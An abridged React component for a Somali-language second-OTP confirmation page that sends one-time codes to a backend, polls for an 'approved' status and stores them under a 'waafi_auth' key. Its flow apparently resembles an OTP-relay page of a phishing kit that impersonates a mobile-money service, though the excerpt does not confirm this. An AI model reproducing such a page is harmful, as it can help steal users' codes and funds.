...
export default function Confirm() {
  ...
  const requestSecondOtp = async () => {
    try {
      ...
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/request-second-otp`, {
        method: 'POST',
        headers: {
      ...
      if (!data.success) {
        console.error('Failed to request second OTP');
      }
    } catch (error) {
      console.error('Error requesting second OTP:', error);
    }
  };
  ...
  const checkOTPStatus = async (phone, otpCode) => {
    ...
    while (Date.now() - startTime < maxTime) {
      try {
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-second-otp-status`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
  ...
  const handleSubmit = async (e) => {
    ...
    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-second-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
      ...
      if (verificationResult.approved) {
        const approvedStatus = '✅ OTP labaad la xaqiijiyay! Socodka...';
        setVerificationStatus(approvedStatus);
        previousStatusRef.current = approvedStatus;
        setIsApproved(true);
        
        // Update auth data with second OTP and mark as authenticated
        updateAuthData({
          secondOtp: fullOtp,
        ...
        try {
          const currentAuth = JSON.parse(localStorage.getItem('waafi_auth') || '{}');
      ...
      console.error('Second OTP verification error:', error);
      setIsSubmitting(false);
      setIsProcessing(false);
      setProgress(0);
      setIsApproved(false);
  ...
  const handleResend = async () => {
    ...
    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/resend-second-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
      ...
      <div className="otp-container">
        <main className="otp-content">
          <div className="processing-card">
            ...
            <h1 className="processing-title">Xaqiijinta OTP-ga Labaad</h1>
